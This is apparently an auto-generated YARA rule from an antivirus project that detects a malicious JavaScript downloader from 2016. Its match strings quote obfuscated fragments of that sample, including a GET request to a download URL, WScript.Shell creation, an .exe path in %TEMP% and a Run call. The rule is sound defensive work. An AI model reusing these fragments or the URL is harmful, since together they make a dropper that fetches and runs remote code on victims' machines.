rule sig_20160330_c2270b724b8a4fa9e5255c1d959787a5 {
  meta:
    description = "datamaliciousorder - file 20160330_c2270b724b8a4fa9e5255c1d959787a5.js"
    author      = "HydraDragonAntivirus"
    reference   = "https://github.com/HydraDragonAntivirus"
    date        = "2026-04-26"
    hash1       = "2d3232a4c01044857cebd4f253c16ada3add0470e9208a19c9b0c94e0c59ff4a"

  strings:
    $s1  = "_O0[_J](\"GET\", \"http://pro.monbento.com/n3iska\", false);" fullword ascii
    $s2  = "var _I = function _WS() {return WScript[_W](\"WScript\"+\".Shell\");}(), _A = 11;" fullword ascii
    $s3  = "function _TX(_E, _C0){_ZE = _ZE * 1; return _E - _C0;};" fullword ascii
    $s4  = "if (_O0[\"readystate\"] < 2 * 2) continue;" fullword ascii
    $s5  = "function _IH(){return _PT + \"\";};" fullword ascii
    $s6  = "function _T() {return _I[\"ExpandEnvironmentStrings\"](\"%TE\"+\"MP%/\") + \"ko9p3BDDVHZ0.ex\" + \"e\";};" fullword ascii
    $s7  = "function _BK() {return ((_RR == true) && (_RR == _U)) ? 1 : _ZE;};" fullword ascii
    $s8  = "function _HM(_MT){_I[\"Run\"](_MT, _ZE, _ZE);};" fullword ascii
    $s9  = "var _B = new this[\"Date\"]();" fullword ascii
    $s10 = "function _F(){return 22;};" fullword ascii
    $s11 = "function _Z(_QD) {var _Y = (1, 2, 3, 4, 5, _QD); return _Y;};" fullword ascii
    $s12 = "function _HU()" fullword ascii
    $s13 = " while (_MA){" fullword ascii
    $s14 = "return _TX(_XL, _LJ);" fullword ascii
    $s15 = "function _P(){return _W;};" fullword ascii
    $s16 = "var _U = false;" fullword ascii
    $s17 = "_U = true; " fullword ascii
    $s18 = "var _O = false;" fullword ascii
    $s19 = "var _RR = false;" fullword ascii
    $s20 = "_RR = true; " fullword ascii

  condition:
    uint16(0) == 0x6176 and
    8 of them
}